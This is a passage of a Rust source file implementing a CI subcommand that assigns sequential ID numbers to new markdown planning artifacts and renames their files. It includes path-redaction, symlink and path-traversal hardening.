//! `forgeplan ci-assign-id` — atomically assign `assigned_number` for new
//! artifacts in a PR per PROB-060 / SPEC-005 / ADR-012.
//!
//! ## Phase 0b prototype scope (binding contract — see Worker 1 prompt)
//!
//! The CI-bot binary part of the EVID-A evidence pack. Wrapped at the
//! `.github/workflows/assign-id.yml` level (Worker 2's owned file) by a
//! `concurrency: forgeplan-id-assign` group that serializes parallel merges.
//! The binary itself is a pure batch job:
//!
//! 1. Walk `--head` for `.forgeplan/**/*.md` artifacts whose frontmatter
//!    carries `slug:` + `assigned_number: null` (Phase 2 lazy-assignment
//!    convention).
//! 2. For each (kind), look up `max(assigned_number)` in `--base` git ref
//!    via [`forgeplan_core::git::max_assigned_number_in_base`] — git-native,
//!    LanceDB-free (ADR-003 invariant + PROB-061 isolation).
//! 3. Mint sequential numbers starting from `max+1`, deterministic order.
//! 4. Detect slug collisions (slug already exists in `--base`) — exit 1
//!    unless `--auto-suffix` is supplied (Phase 0b prototype: warning only;
//!    rename is Phase 2.1's responsibility — now implemented in Phase 2.2).
//! 5. Rewrite frontmatter and (Phase 2.2) rename file from
//!    `<kind>-<slug-suffix>.md` → `<KIND>-<NNN>-<slug-suffix>.md` so the
//!    on-disk filename agrees with the freshly assigned display ID.
//! 6. Emit either human-readable summary or `--json` per CD-3 schema.
//!
//! ## What this binary deliberately does NOT do (Phase 0b/2 boundaries)
//!
//! - Touch LanceDB (`lance/`) — ADR-003 red-line #8.
//! - Read `change_log` table — PROB-061 isolation.
//! - Run `git commit` / `git push` — workflow YAML wraps and commits.
//! - Network calls — purely local git plumbing.
//!
//! ## Phase 2.2 — file rename atomicity (CD-4 binding)
//!
//! After [`set_assigned_number`] rewrites the frontmatter atomically (tmp
//! plus POSIX rename), [`apply_plan`] additionally renames the file itself
//! from the Phase 1 placeholder shape to the display-id-prefixed form
//! (e.g. `prd-auth-system.md` becomes `PRD-074-auth-system.md`).
//!
//! Rename strategy: `git mv` if we're inside a git work tree (preserves
//! history under squash-merge), with [`std::fs::rename`] as a fallback
//! for non-git callers (tests, ad-hoc CLI use). Idempotent — if the
//! filename already matches the target, no rename is invoked.
//!
//! Reflected in [`Assignment::action`] via additive enum variants per
//! CD-3 — `renamed` and `renamed_and_assigned`. The JSON
//! `schema_version` stays at `1` because consumers must already treat
//! `action` as an open-set string per the original CD-3 contract.

use std::path::{Path, PathBuf};

use anyhow::{Context, Result};
use chrono::Utc;

/// PROB-060 Phase 0b Round 2 [SEC-5 CWE-200]: redact filesystem paths in
/// error messages and log output. Workspace-relative paths are safe to
/// surface; absolute filesystem paths (`/home/runner/work/…`) leak CI
/// layout and are stripped to just the file basename if outside the
/// workspace.
///
/// Returns the path verbatim as a `String` for ergonomic use in
/// `format!`/`anyhow::bail!`. Caller must pass an already-canonicalized
/// or known-good `workspace`; we only do a string-level prefix check.
fn redact_path(workspace: &Path, path: &Path) -> String {
    if let Ok(rel) = path.strip_prefix(workspace) {
        return rel.display().to_string();
    }
    // Outside the workspace — strip everything but the basename.
    path.file_name()
        .and_then(|n| n.to_str())
        .map(|s| s.to_string())
        .unwrap_or_else(|| "<unknown>".to_string())
}
use forgeplan_core::artifact::frontmatter::{
    assigned_number_from_frontmatter, parse_frontmatter, predicted_number_from_frontmatter,
    set_assigned_number, slug_from_frontmatter,
};
use forgeplan_core::artifact::types::{ArtifactKind, validate_slug};
use forgeplan_core::git::{
    artifact_filenames_in_origin_dev, max_assigned_number_in_base, slug_exists_in_filenames,
    validate_git_ref,
};
use serde::Serialize;

/// Parsed CLI arguments for `ci-assign-id` (Worker 1 owned; main.rs builds
/// this struct via `clap::Parser` derive on the subcommand variant).
#[derive(Debug, Clone)]
pub struct CiAssignIdArgs {
    /// PR number (informational, used in commit message). Required in CI;
    /// defaults to 0 for local/test runs.
    pub pr: u64,
    /// Repo slug `owner/name` (informational). Optional. Default: detect
    /// from `git remote get-url origin`. We do **not** require it — the
    /// binary is repo-agnostic.
    pub repo: Option<String>,
    /// Git ref for "destination" state for `max(assigned_number)` lookup.
    /// Default: `origin/dev`.
    pub base: String,
    /// Git ref for "incoming" PR state. Default: `HEAD`.
    pub head: String,
    /// Workspace root. Default: cwd.
    pub workspace: Option<PathBuf>,
    /// Do not write frontmatter; print what would change.
    pub dry_run: bool,
    /// On slug collision (slug already exists on `--base`), suggest
    /// `<slug>-<assigned_number>` rename. Phase 0b: prototype only — emits
    /// warning to stderr.
    pub auto_suffix: bool,
    /// Emit machine-readable JSON to stdout instead of human-readable.
    pub json: bool,
}

impl Default for CiAssignIdArgs {
    fn default() -> Self {
        Self {
            pr: 0,
            repo: None,
            base: "origin/dev".to_string(),
            head: "HEAD".to_string(),
            workspace: None,
            dry_run: false,
            auto_suffix: false,
            json: false,
        }
    }
}

/// Exit code contract per CD-1.
const EXIT_SUCCESS: i32 = 0;
const EXIT_COLLISION: i32 = 1;
const EXIT_NO_CANDIDATES: i32 = 2;
const EXIT_CONFIG_ERROR: i32 = 3;
const EXIT_INVARIANT_VIOLATION: i32 = 4;

/// JSON output schema version (CD-3).
const JSON_SCHEMA_VERSION: u32 = 1;

/// Per-artifact assignment record (CD-3 `assignments[]` element).
#[derive(Debug, Clone, Serialize)]
pub struct Assignment {
    pub slug: String,
    pub kind: String,
    /// Workspace-relative path to the artifact file.  When Phase 2.2
    /// rename takes effect, this reflects the **post-rename** filename
    /// (e.g. `.forgeplan/prds/PRD-074-auth-system.md`) so JSON consumers
    /// see the canonical on-disk location.
    pub path: String,
    pub predicted_number: Option<u32>,
    pub assigned_number: u32,
    pub max_in_base: Option<u32>,
    /// One of the following CD-3 action strings:
    /// * `assigned` — frontmatter rewritten this run (no rename needed).
    /// * `renamed` — file renamed this run (frontmatter was already
    ///   correct; recovers from a partial earlier run that rewrote
    ///   frontmatter but failed before the rename step).
    /// * `renamed_and_assigned` — both frontmatter and rename happened
    ///   this run (the common Phase 2.2 fresh-assignment path).
    /// * `skipped_already_assigned` — no-op (idempotent re-run on a
    ///   fully-numbered + correctly-named artifact).
    /// * `would_assign` — dry-run preview; no filesystem mutation.
    ///
    /// CD-3 is additive — `JSON_SCHEMA_VERSION` stays at `1` because
    /// consumers must treat `action` as an open-set string per the
    /// initial Phase 0b contract.
    pub action: String,
}

/// Per-artifact collision record (CD-3 `collisions[]` element).
#[derive(Debug, Clone, Serialize)]
pub struct Collision {
    pub slug: String,
    pub kind: String,
    pub path: String,
    pub conflicts_with_base_path: String,
    pub suggested_resolution: String,
}

/// Summary block (CD-3 `summary`).
#[derive(Debug, Clone, Serialize)]
pub struct Summary {
    pub total_candidates: usize,
    pub assigned: usize,
    pub skipped_already_assigned: usize,
    pub collisions: usize,
    pub exit_code: i32,
}

/// Top-level JSON output (CD-3).
#[derive(Debug, Clone, Serialize)]
pub struct CiAssignIdOutput {
    pub schema_version: u32,
    pub ran_at: String,
    pub pr: u64,
    pub repo: String,
    pub base: String,
    pub head: String,
    pub dry_run: bool,
    pub assignments: Vec<Assignment>,
    pub collisions: Vec<Collision>,
    pub summary: Summary,
    pub commit_message_suggested: String,
}

/// Internal "candidate" — an artifact in `--head` we may need to assign.
#[derive(Debug, Clone)]
pub struct Candidate {
    pub slug: String,
    pub kind: ArtifactKind,
    pub path: PathBuf,
    pub predicted_number: Option<u32>,
    pub current_assigned: Option<u32>,
}

/// Plan element after consultation with `--base`.
#[derive(Debug, Clone)]
pub struct PlanItem {
    pub candidate: Candidate,
    pub assigned_number: u32,
    pub max_in_base: Option<u32>,
    pub already_assigned: bool,
    pub collision: Option<String>, // human-readable suggestion
}

/// Top-level entry point.
///
/// Returns the exit code (caller propagates via `std::process::exit`).
/// All side effects (file writes, stdout/stderr) happen inside.
pub async fn run(args: CiAssignIdArgs) -> Result<i32> {
    // PROB-060 Phase 0b SEC-1 [CWE-88]: validate refs early, before any
    // process spawn. Failures map to CD-1 exit code 3 (config/git error).
    if let Err(e) = validate_git_ref(&args.base) {
        eprintln!("ci-assign-id: invalid --base ref: {e}");
        return Ok(EXIT_CONFIG_ERROR);
    }
    if let Err(e) = validate_git_ref(&args.head) {
        eprintln!("ci-assign-id: invalid --head ref: {e}");
        return Ok(EXIT_CONFIG_ERROR);
    }

    // Resolve workspace root.
    let workspace = match &args.workspace {
        Some(w) => w.clone(),
        None => std::env::current_dir().context("read cwd")?,
    };

    // 1. Discover candidate artifacts.
    let candidates = discover_candidates(&workspace)
        .with_context(|| format!("discovering candidates under {}", workspace.display()))?;

    if candidates.is_empty() {
        let output = CiAssignIdOutput {
            schema_version: JSON_SCHEMA_VERSION,
            ran_at: Utc::now().to_rfc3339(),
            pr: args.pr,
            repo: args.repo.clone().unwrap_or_default(),
            base: args.base.clone(),
            head: args.head.clone(),
            dry_run: args.dry_run,
            assignments: vec![],
            collisions: vec![],
            summary: Summary {
                total_candidates: 0,
                assigned: 0,
                skipped_already_assigned: 0,
                collisions: 0,
                exit_code: EXIT_NO_CANDIDATES,
            },
            commit_message_suggested: String::new(),
        };
        if args.json {
            println!(
                "{}",
                render_json_summary(&output).context("render JSON summary")?
            );
        } else {
            eprintln!(
                "ci-assign-id: no candidate artifacts found in {}",
                args.head
            );
            print!("{}", render_human_summary(&output));
        }
        return Ok(EXIT_NO_CANDIDATES);
    }

    // 2. Compute assignment plan against base.
    // CRIT-2 Layer B: catch invariant violations and return EXIT_INVARIANT_VIOLATION
    let plan = match compute_assignment_plan(&workspace, &args.base, &candidates) {
        Ok(p) => p,
        Err(e) if e.to_string().contains("CRIT-2 invariant violation") => {
            eprintln!("{}", e);
            return Ok(EXIT_INVARIANT_VIOLATION);
        }
        Err(e) => {
            return Err(e)
                .with_context(|| format!("computing plan against base ref {}", args.base))?;
        }
    };

    // 3. Apply (or simulate if --dry-run). Round 2 [CR-7]: auto_suffix
    //    no longer plumbed through to apply_plan — collision suffix is
    //    decided in compute_assignment_plan above.
    let (assignments, collisions) =
        apply_plan(&workspace, &plan, args.dry_run).context("applying assignment plan")?;

    // 4. Build output.
    let exit_code = if !collisions.is_empty() && !args.auto_suffix {
        EXIT_COLLISION
    } else {
        EXIT_SUCCESS
    };

    let summary = Summary {
        total_candidates: plan.len(),
        assigned: assignments
            .iter()
            .filter(|a| a.action == "assigned" || a.action == "would_assign")
            .count(),
        skipped_already_assigned: assignments
            .iter()
            .filter(|a| a.action == "skipped_already_assigned")
            .count(),
        collisions: collisions.len(),
        exit_code,
    };

    let commit_message_suggested = build_commit_message(args.pr, &assignments);

    let output = CiAssignIdOutput {
        schema_version: JSON_SCHEMA_VERSION,
        ran_at: Utc::now().to_rfc3339(),
        pr: args.pr,
        repo: args.repo.clone().unwrap_or_else(|| detect_repo(&workspace)),
        base: args.base.clone(),
        head: args.head.clone(),
        dry_run: args.dry_run,
        assignments,
        collisions: collisions.clone(),
        summary,
        commit_message_suggested,
    };

    if args.json {
        println!("{}", render_json_summary(&output).context("render JSON")?);
    } else {
        for c in &collisions {
            eprintln!(
                "warning: slug collision: {} ({}) collides with {}; suggested: {}",
                c.slug, c.kind, c.conflicts_with_base_path, c.suggested_resolution
            );
        }
        print!("{}", render_human_summary(&output));
    }

    Ok(exit_code)
}

/// Walk the workspace's `.forgeplan/<kind_dir>/*.md` files; collect those
/// with a parseable frontmatter and a `slug:` field.
///
/// **Idempotency contract (Phase 0b)**: candidates *include* artifacts whose
/// `assigned_number` is already set — but the planner marks them
/// `already_assigned` so [`apply_plan`] emits `skipped_already_assigned`
/// instead of mutating. Re-running the binary on a fully-assigned PR is
/// thus a no-op (exit 0).
pub fn discover_candidates(workspace: &Path) -> Result<Vec<Candidate>> {
    let mut out = Vec::new();
    let all_kinds = [
        ArtifactKind::Prd,
        ArtifactKind::Rfc,
        ArtifactKind::Adr,
        ArtifactKind::Epic,
        ArtifactKind::Spec,
        ArtifactKind::ProblemCard,
        ArtifactKind::SolutionPortfolio,
        ArtifactKind::EvidencePack,
        ArtifactKind::Note,
        ArtifactKind::RefreshReport,
        // ArtifactKind::Memory excluded — memories don't carry assigned_number.
    ];

    for kind in &all_kinds {
        let dir = workspace.join(".forgeplan").join(kind.dir_name());
        if !dir.is_dir() {
            continue;
        }
        for entry in std::fs::read_dir(&dir)
            .with_context(|| format!("read_dir {}", redact_path(workspace, &dir)))?
        {
            let entry = entry?;
            let path = entry.path();
            if path.extension().and_then(|e| e.to_str()) != Some("md") {
                continue;
            }
            // PROB-060 Phase 0b CR-2 fix: propagate I/O errors с `?`. A
            // file that `read_dir` enumerated but `read_to_string` cannot
            // open is a real CI fault (corrupt fs, permission denied,
            // race), not a "silent skip-OK" case.
            let content = std::fs::read_to_string(&path)
                .with_context(|| format!("ci-assign-id: read {}", redact_path(workspace, &path)))?;
            let (fm, _body) = match parse_frontmatter(&content) {
                Ok(parts) => parts,
                Err(e) => {
                    // PROB-060 Phase 0b CR-2 fix: surface parse failures
                    // instead of silently skipping. Continue с remaining
                    // candidates so one bad file doesn't block CI.
                    // Round 2 [SEC-5]: redact path to workspace-relative.
                    eprintln!(
                        "ci-assign-id: skipping {}: frontmatter parse failed: {e}",
                        redact_path(workspace, &path)
                    );
                    continue;
                }
            };
            let slug = match slug_from_frontmatter(&fm) {
                Some(s) => s.to_string(),
                None => continue,
            };
            // PROB-060 Phase 0b SEC-2 [CWE-94] Part B: re-validate slug
            // here, on the read path. The frontmatter is PR-controlled
            // YAML и flows downstream into commit messages, JSON output,
            // и `git commit -m` arguments. validate_slug is the single
            // source of truth для SPEC-005 slug shape; an invalid slug
            // here means the frontmatter has been tampered with или the
            // author skipped `forgeplan new`. Fail loudly rather than
            // letting bogus content reach commit-msg interpolation.
            if let Err(e) = validate_slug(&slug) {
                anyhow::bail!(
                    "ci-assign-id: malformed slug {slug:?} in {}: {e}",
                    redact_path(workspace, &path)
                );
            }
            let predicted = predicted_number_from_frontmatter(&fm);
            let current_assigned = assigned_number_from_frontmatter(&fm);
            out.push(Candidate {
                slug,
                kind: kind.clone(),
                path,
                predicted_number: predicted,
                current_assigned,
            });
        }
    }

    out.sort_by(|a, b| a.path.cmp(&b.path));
    Ok(out)
}

/// Convert candidates → plan items with assigned numbers.
///
/// PROB-060 Phase 0b Round 2 [E2E-2]: 2-pass strategy eliminates the
/// iteration-order edge case where a candidate carrying
/// `current_assigned: Some(n)` appears *after* one or more `null`
/// candidates. Pass 1 absorbs every existing `assigned_number` into the
/// per-kind sequence counter; pass 2 then assigns nulls strictly above
/// that absorbed maximum. Without the 2-pass shape, an input like
/// `[null, null, existing=80]` against `max_in_base=73` would produce
/// `74, 75, 80` — leaking 80 across the next CI run boundary.
///
/// CRIT-2 Layer B: Detect pre-set assigned_number on new artifacts and exit
/// with EXIT_INVARIANT_VIOLATION. A new artifact (not in base ref) must not
/// carry a pre-set assigned_number — only the CI bot is allowed to assign
/// these numbers after merge. Fail-closed to defend against tampering.
///
/// [Round 3 Code FINDING-4] This is the production wrapper that fetches
/// `max_per_kind` and `base_files_per_kind` from git
/// (`max_assigned_number_in_base` + `artifact_filenames_in_origin_dev`).
/// The pure inner function [`compute_assignment_plan_with_bases`] takes
/// those two maps as parameters so unit tests can inject fixture data
/// without standing up a remote — see `compute_plan_layer_b_*` tests.
pub fn compute_assignment_plan(
    workspace: &Path,
    base_ref: &str,
    candidates: &[Candidate],
) -> Result<Vec<PlanItem>> {
    use std::collections::BTreeMap;

    // Discover unique kind dirs touched by this batch.
    let mut kind_dirs: Vec<String> = candidates
        .iter()
        .map(|c| c.kind.dir_name().to_string())
        .collect();
    kind_dirs.sort();
    kind_dirs.dedup();

    let mut max_per_kind: BTreeMap<String, Option<u32>> = BTreeMap::new();
    let mut base_files_per_kind: BTreeMap<String, Vec<String>> = BTreeMap::new();

    // Seed bases from `--base` for every kind in the batch.
    for kind_dir in &kind_dirs {
        let kind = match dir_name_to_kind(kind_dir) {
            Some(k) => k,
            None => continue,
        };
        let max_in_base = max_assigned_number_in_base(workspace, base_ref, &kind)?;
        max_per_kind.insert(kind_dir.clone(), max_in_base);
        let files = artifact_filenames_in_origin_dev(workspace, kind_dir);
        base_files_per_kind.insert(kind_dir.clone(), files);
    }

    compute_assignment_plan_with_bases(
        workspace,
        base_ref,
        candidates,
        &max_per_kind,
        &base_files_per_kind,
    )
}

/// Pure plan computation given pre-fetched per-kind bases.
///
/// Extracted from [`compute_assignment_plan`] for testability — accepts
/// `max_per_kind` and `base_files_per_kind` as injection-friendly
/// `BTreeMap` parameters so unit tests can construct fixture state
/// directly without standing up an `origin/dev` remote.
///
/// **Inputs**:
/// * `workspace` — used only for path redaction in error messages.
/// * `base_ref` — used only for the human-readable "in base ref X"
///   string in the INVARIANT VIOLATION message.
/// * `candidates` — slice of [`Candidate`]s to convert into [`PlanItem`]s.
/// * `max_per_kind` — for each kind dir present in `candidates`, the
///   maximum `assigned_number` in the base ref (or `None` if base has
///   no artifacts for that kind). Drives the `max_in_base` field on
///   each emitted [`PlanItem`].
/// * `base_files_per_kind` — for each kind dir present in `candidates`,
///   the basenames of `.md` files in `<base_ref>:.forgeplan/<kind_dir>/`.
///   Drives both Layer B's "exists in base" check (CRIT-2 invariant
///   guard against tampered new artifacts) и the collision-suggestion
///   field on each emitted [`PlanItem`].
///
/// **Errors**: `Err(_)` on CRIT-2 invariant violation — a candidate with
/// `current_assigned: Some(_)` whose slug doesn't exist in the
/// corresponding base files (i.e. a new artifact carrying a pre-set
/// assigned_number, which only the CI bot may set after merge).
pub fn compute_assignment_plan_with_bases(
    workspace: &Path,
    base_ref: &str,
    candidates: &[Candidate],
    max_per_kind: &std::collections::BTreeMap<String, Option<u32>>,
    base_files_per_kind: &std::collections::BTreeMap<String, Vec<String>>,
) -> Result<Vec<PlanItem>> {
    use std::collections::HashMap;

    let mut seq_per_kind: HashMap<String, u32> = HashMap::new();
    // Seed sequence counters from max_per_kind.
    for (kind_dir, max_opt) in max_per_kind {
        seq_per_kind.insert(kind_dir.clone(), max_opt.unwrap_or(0));
    }

    // CRIT-2 Layer B: Pre-flight check — reject pre-set assigned_number on new artifacts
    // Only check when there ARE existing artifacts in base for this kind.
    // If base_files is empty for a kind, the artifact might be the first in that kind,
    // and re-processing is legitimate (idempotent re-run of the assignment).
    for c in candidates {
        if let Some(existing) = c.current_assigned {
            let kind_dir = c.kind.dir_name().to_string();
            let base_files = base_files_per_kind
                .get(&kind_dir)
                .cloned()
                .unwrap_or_default();

            // Skip check if no artifacts exist in base yet for this kind
            if base_files.is_empty() {
                continue;
            }

            // Check if this specific artifact exists in the base ref.
            //
            // [Round 2 Sec FINDING-3 fix] Replace ad-hoc substring matcher
            // (`f.ends_with("{slug}.md") || f.contains("{slug}-")`) with the
            // canonical helper `slug_exists_in_filenames`. The old logic was
            // broken bidirectionally:
            //   * **False positive**: `slug.contains("-")` matched any
            //     filename containing `<slug>-` as a substring — e.g.
            //     filename `prd-auth-systemicness.md` would match slug
            //     `prd-auth-system` because of the `-` boundary, allowing a
            //     tampered new artifact whose slug overlaps an existing base
            //     filename to slip through.
            //   * **False negative**: matching was case-sensitive against
            //     literal slug, but post-merge filenames are uppercase
            //     (`PRD-074-foo.md`) — re-running the bot against an
            //     already-merged artifact would (incorrectly) classify it as
            //     "not in base" and bail with INVARIANT VIOLATION.
            // `slug_exists_in_filenames` handles both pre-merge
            // (`prd-auth-system.md`) and post-merge (`PRD-074-auth-system.md`)
            // forms via case-insensitive ASCII compare, exactly mirroring the
            // collision check at line 574 below.
            let exists_in_base = slug_exists_in_filenames(&c.slug, &base_files);

            // Fail closed: new artifact (not in base) with pre-set assigned_number is an invariant violation
            if !exists_in_base {
                eprintln!(
                    "INVARIANT VIOLATION: New artifact {} in {} has pre-set assigned_number: {} \
                     (only CI bot may assign numbers after merge)",
                    redact_path(workspace, &c.path),
                    base_ref,
                    existing
                );
                anyhow::bail!(
                    "CRIT-2 invariant violation: pre-set assigned_number on new artifact '{}' \
                     (file: {})",
                    c.slug,
                    redact_path(workspace, &c.path)
                );
            }
        }
    }

    // Pass 1: absorb every already-assigned number into the per-kind
    // sequence counter, in any input order. After this loop,
    // `seq_per_kind[k]` ≥ max(existing, max_in_base) for every kind.
    for c in candidates {
        if let Some(existing) = c.current_assigned {
            let kind_dir = c.kind.dir_name().to_string();
            let entry = seq_per_kind.entry(kind_dir).or_insert(0);
            *entry = (*entry).max(existing);
        }
    }

    // Pass 2: emit plan items in input order. Nulls now mint numbers
    // strictly above all absorbed existing numbers, so collisions are
    // impossible regardless of how the original input was ordered.
    let mut output: Vec<PlanItem> = Vec::with_capacity(candidates.len());
    for c in candidates {
        let kind_dir = c.kind.dir_name().to_string();
        let max_in_base = max_per_kind.get(&kind_dir).cloned().flatten();
        let base_files = base_files_per_kind
            .get(&kind_dir)
            .cloned()
            .unwrap_or_default();

        if let Some(existing) = c.current_assigned {
            output.push(PlanItem {
                candidate: c.clone(),
                assigned_number: existing,
                max_in_base,
                already_assigned: true,
                collision: None,
            });
            continue;
        }

        let seq = seq_per_kind.entry(kind_dir.clone()).or_insert(0);
        *seq += 1;
        let assigned_number = *seq;

        let collision = if slug_exists_in_filenames(&c.slug, &base_files) {
            Some(format!("{}-{}", c.slug, assigned_number))
        } else {
            None
        };

        output.push(PlanItem {
            candidate: c.clone(),
            assigned_number,
            max_in_base,
            already_assigned: false,
            collision,
        });
    }

    Ok(output)
}

/// Compute the Phase 2.2 target filename for a freshly assigned artifact.
///
/// **Pattern**: `<KIND>-<NNN>-<slug-suffix>.md` where:
/// * `KIND` is the uppercased canonical prefix (`PRD`, `RFC`, `PROB`, …)
///   derived from [`ArtifactKind::prefix`] (without trailing dash). Mirror
///   of [`display_id`]'s mapping — same source of truth for kind→prefix.
/// * `NNN` is `assigned_number` zero-padded to three digits.
/// * `slug-suffix` is the slug with the kind prefix stripped
///   (`prd-auth-system` → `auth-system`). If the slug somehow lacks the
///   expected prefix (defensive — `validate_slug` guarantees the shape
///   upstream), we fall back to the bare slug.
///
/// Pure function — no filesystem access, easy to unit-test (see
/// `target_filename_*` tests below).
fn target_filename(kind: &ArtifactKind, slug: &str, assigned_number: u32) -> String {
    let kind_prefix_lc = kind.prefix().trim_end_matches('-'); // "prd"
    let kind_prefix_uc = kind_prefix_lc.to_uppercase(); // "PRD"
    let suffix = slug
        .strip_prefix(kind.prefix())
        .unwrap_or(slug)
        .trim_start_matches('-');
    if suffix.is_empty() {
        // Degenerate — slug was exactly the prefix. Emit `KIND-NNN.md`
        // rather than a trailing-dash filename. validate_slug rejects
        // this shape upstream so this branch is defensive only.
        format!("{kind_prefix_uc}-{assigned_number:03}.md")
    } else {
        format!("{kind_prefix_uc}-{assigned_number:03}-{suffix}.md")
    }
}

/// Detect whether `workspace` lies inside a git work tree.
///
/// Used to decide between `git mv` (preserves blame/history under the
/// post-merge squash) and a plain [`std::fs::rename`] fallback (tests,
/// ad-hoc local CLI use). `git rev-parse --is-inside-work-tree` is the
/// canonical query — it returns `true` on stdout and exit 0 inside a
/// repo, exit non-zero outside. We treat any failure (git missing,
/// network FS quirk, IO error) as "not a git repo" — the
/// [`std::fs::rename`] fallback is correct in either case for the
/// rename outcome.
fn is_inside_git_repo(workspace: &Path) -> bool {
    std::process::Command::new("git")
        .args(["rev-parse", "--is-inside-work-tree"])
        .current_dir(workspace)
        .output()
        .map(|o| o.status.success() && String::from_utf8_lossy(&o.stdout).trim() == "true")
        .unwrap_or(false)
}

/// Rename a tracked artifact file from `from` → `to` while preserving git
/// history when possible. Phase 2.2 (CD-4) — atomicity contract:
///
/// 1. **In a git repo**: invoke `git mv -- <from> <to>`. `git mv` records
///    the move in the index so blame/log surface continuity post-merge.
///    On failure (e.g. file not yet `git add`-ed in fresh-fixture tests)
///    we silently fall through to [`std::fs::rename`] — the rename still
///    has to happen for the binary's contract; the worst case is loss of
///    history continuity, which the wrapping workflow's `git add -A`
///    step would also induce.
/// 2. **Outside a git repo or git failed**: [`std::fs::rename`].
///
/// The target must NOT already exist as a distinct file — overlay a
/// pre-rename idempotency check at the call site (compare canonical
/// paths) before invoking. We surface IO errors with `Context` so the
/// caller's `with_context` chain points at the offending pair.
fn rename_artifact_file(workspace: &Path, from: &Path, to: &Path) -> Result<()> {
    if is_inside_git_repo(workspace) {
        let output = std::process::Command::new("git")
            .args(["mv", "--"])
            .arg(from)
            .arg(to)
            .current_dir(workspace)
            .output();
        if let Ok(o) = output
            && o.status.success()
        {
            return Ok(());
        }
        // git mv refused (e.g. unstaged file in test fixtures) or git
        // is unavailable. Fall through to plain rename — the file
        // system mutation still needs to happen and the wrapper
        // workflow's `git add -A` will record the rename.
    }
    std::fs::rename(from, to).with_context(|| {
        format!(
            "ci-assign-id: rename {} -> {}",
            redact_path(workspace, from),
            redact_path(workspace, to)
        )
    })
}

/// Apply the plan: rewrite frontmatter, rename file (Phase 2.2), return
/// assignment + collision lists.
///
/// PROB-060 Phase 0b Round 2 closures:
/// - **[CR-7]** drops the no-op `auto_suffix` parameter — Phase 0b
///   prototype semantics did not consult the flag here. Collision-resolution
///   suffix lives in [`compute_assignment_plan`] (driven by `--auto-suffix`
///   surfaced at `run`).
/// - **[SEC-6 CWE-367]** TOCTOU + symlink hardening:
///     * reject any candidate whose `path` is a symlink (would let a PR
///       redirect the write target outside `.forgeplan/`);
///     * canonicalize the path and assert it stays under the canonicalized
///       workspace (path-traversal defense);
///     * write to a sibling tmp file via [`tempfile::NamedTempFile::new_in`]
///       (Round 3 Sec FINDING-12 — random suffix, no collision) and
///       `rename` to publish atomically — a crash mid-write leaves
///       either the old or new file, never a half-written one.
///
/// Phase 2.2 [CD-4] additions:
/// - After the frontmatter rewrite (or skipping it for already-assigned
///   artifacts), compute the target filename via [`target_filename`].
/// - If the current basename differs from the target, rename via
///   [`rename_artifact_file`] (`git mv` when in a repo, `std::fs::rename`
///   otherwise). The same SEC-5/SEC-6 invariants apply: target must
///   stay inside the workspace and must not collide with a distinct
///   existing file.
/// - The [`Assignment::path`] in the returned vector reflects the
///   **post-rename** filename so consumers see canonical state.
/// - Action enum extended: `renamed`, `renamed_and_assigned` (additive
///   per CD-3 — `JSON_SCHEMA_VERSION` unchanged).
/// - Dry-run remains side-effect-free: no rename is invoked, action
///   stays at `would_assign` / `skipped_already_assigned` for parity
///   with the existing dry-run contract.
pub fn apply_plan(
    workspace: &Path,
    plan: &[PlanItem],
    dry_run: bool,
) -> Result<(Vec<Assignment>, Vec<Collision>)> {
    let mut assignments = Vec::new();
    let mut collisions = Vec::new();

    // Canonicalize the workspace once. If canonicalize fails (e.g. the
    // workspace was deleted out from under us), we can still proceed for
    // dry-run paths but writes will fail loudly below.
    let canonical_workspace = std::fs::canonicalize(workspace).ok();

    for item in plan {
        let kind_template_key = item.candidate.kind.template_key().to_string();
        let mut current_path = item.candidate.path.clone();
        let path_str = current_path.to_string_lossy().into_owned();

        if let Some(suggested) = &item.collision {
            collisions.push(Collision {
                slug: item.candidate.slug.clone(),
                kind: kind_template_key.clone(),
                path: path_str.clone(),
                conflicts_with_base_path: format!(
                    ".forgeplan/{}/{}.md",
                    item.candidate.kind.dir_name(),
                    item.candidate.slug
                ),
                suggested_resolution: suggested.clone(),
            });
            // Phase 0b prototype: collision-resolution suffix is decided
            // upstream in compute_assignment_plan — not here.
            continue;
        }

        // Phase 2.2 [CD-4]: compute the desired post-assignment basename
        // up front. Used both to decide whether a rename is needed and
        // (in non-dry-run) to actually invoke `git mv` / `std::fs::rename`.
        let target_basename = target_filename(
            &item.candidate.kind,
            &item.candidate.slug,
            item.assigned_number,
        );
        let current_basename = current_path
            .file_name()
            .and_then(|n| n.to_str())
            .unwrap_or("")
            .to_string();
        let needs_rename = current_basename != target_basename;

        if item.already_assigned {
            // Phase 2.2 recovery path: frontmatter is already correct,
            // but a previous run may have crashed between rewrite and
            // rename. If the basename still doesn't match the target,
            // rename now (non-dry-run) and report `renamed`. Otherwise
            // it's a true no-op.
            let action = if !dry_run && needs_rename {
                let target_path = match rename_target_path(
                    workspace,
                    canonical_workspace.as_deref(),
                    &current_path,
                    &target_basename,
                )? {
                    Some(p) => p,
                    None => {
                        // Idempotent: target already exists and is the
                        // same file (e.g. cross-FS quirk). Treat as
                        // already-renamed.
                        current_path.clone()
                    }
                };
                rename_artifact_file(workspace, &current_path, &target_path)?;
                current_path = target_path;
                "renamed".to_string()
            } else {
                "skipped_already_assigned".to_string()
            };
            assignments.push(Assignment {
                slug: item.candidate.slug.clone(),
                kind: kind_template_key,
                path: current_path.to_string_lossy().into_owned(),
                predicted_number: item.candidate.predicted_number,
                assigned_number: item.assigned_number,
                max_in_base: item.max_in_base,
                action,
            });
            continue;
        }

        if !dry_run {
            // [SEC-6 CWE-367] symlink check: refuse to follow symlinks.
            // symlink_metadata never traverses, unlike metadata().
            let lmeta = std::fs::symlink_metadata(&current_path).with_context(|| {
                format!(
                    "ci-assign-id: stat {} (symlink check)",
                    redact_path(workspace, &current_path)
                )
            })?;
            if lmeta.file_type().is_symlink() {
                anyhow::bail!(
                    "ci-assign-id: refusing to follow symlink artifact {} [SEC-6]",
                    redact_path(workspace, &current_path)
                );
            }

            // [SEC-6] path traversal: canonicalize the candidate and
            // verify it stays under the canonicalized workspace.
            if let Some(ws_canon) = canonical_workspace.as_ref() {
                let path_canon = std::fs::canonicalize(&current_path).with_context(|| {
                    format!(
                        "ci-assign-id: canonicalize {}",
                        redact_path(workspace, &current_path)
                    )
                })?;
                if !path_canon.starts_with(ws_canon) {
                    anyhow::bail!(
                        "ci-assign-id: path {} escapes workspace [SEC-6 invariant violation]",
                        redact_path(workspace, &current_path)
                    );
                }
            }

            let content = std::fs::read_to_string(&current_path).with_context(|| {
                format!(
                    "ci-assign-id: read {} for assigned_number rewrite",
                    redact_path(workspace, &current_path)
                )
            })?;
            let new_content =
